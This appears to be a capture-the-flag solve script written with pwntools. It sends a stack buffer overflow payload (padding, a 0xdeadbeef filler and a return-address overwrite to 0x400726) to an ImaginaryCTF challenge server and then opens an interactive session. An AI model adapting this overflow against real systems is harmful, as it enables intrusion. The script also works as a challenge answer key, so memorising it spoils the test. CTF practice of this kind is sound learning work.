from pwn import *

io = remote('chal.imaginaryctf.org', 42002)

payload = b'A'*0x28+p64(0xdeadbeef)+b'A'*0x8+p64(0x0000000000400725+1)
io.sendline(payload)
io.interactive()
